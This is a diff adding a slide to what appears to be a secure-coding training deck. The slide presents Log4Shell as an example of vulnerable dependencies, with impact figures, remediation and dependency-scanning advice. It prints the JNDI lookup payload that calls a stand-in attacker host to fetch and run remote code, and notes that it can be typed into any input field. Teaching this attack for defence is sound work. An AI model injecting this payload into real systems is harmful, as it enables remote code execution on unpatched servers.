@@ -780,6 +780,45 @@ $stmt->execute([$username, $password]);  // User input is data, never code
 
 ---
 
+## SLIDE 27B — LOG4SHELL: A06 IN PRACTICE
+
+**Visual:** World map with glowing red dots spreading rapidly from left to right, representing exploit attempts. Timeline bar showing: "Dec 9 — Disclosed → Dec 10 — 10K exploits/hr → Dec 11 — 800K exploits/hr." Bottom stat badge in red: "CVSS 10.0 — MAXIMUM SEVERITY."
+
+**Content:**
+```
+LOG4SHELL (CVE-2021-44228)
+OWASP A06 — The Most Critical Vulnerability of the Decade
+
+THE VULNERABLE CODE:
+Apache Log4j — a Java logging library in BILLIONS of applications
+Amazon · Apple iCloud · Microsoft · Google · Tesla · Cloudflare
+
+THE EXPLOIT (just type this into a search box or username field):
+${jndi:ldap://attacker.com/exploit}
+
+Log4j sees it → fetches the attacker's server → executes their code
+→ Full Remote Code Execution. Zero authentication required.
+
+THE IMPACT:
+✗ 800,000 exploitation attempts per HOUR within 72 hours
+✗ Nation-states, ransomware gangs, script kiddies — all using same exploit
+✗ Every unpatched Java application exposed globally
+
+THE LESSON (A06):
+Nobody WROTE this code — they INCLUDED it as a dependency.
+One line: log4j:log4j:2.14.1
+
+REMEDIATION: Upgrade to Log4j 2.17.1+
+PREVENTION: Software Composition Analysis (SCA) scanning — scan ALL
+your dependencies for known CVEs before deployment.
+
+Tools: Snyk · Dependabot · OWASP Dependency-Check
+```
+
+**Speaker notes:** "Who installed Log4j? The answer is: developers, by adding one line to a build file. You are responsible for the security of every line of code your application runs — including the code you didn't write. SCA tools are now a mandatory part of any professional development pipeline."
+
+---
+
 ## SLIDE 28 — MODULE 8 OPENER: SOCIAL ENGINEERING
 
 **Visual:** Email inbox showing a realistic phishing email. Red warning overlays identifying the manipulation elements: fake sender, urgency, suspicious link, fear trigger.
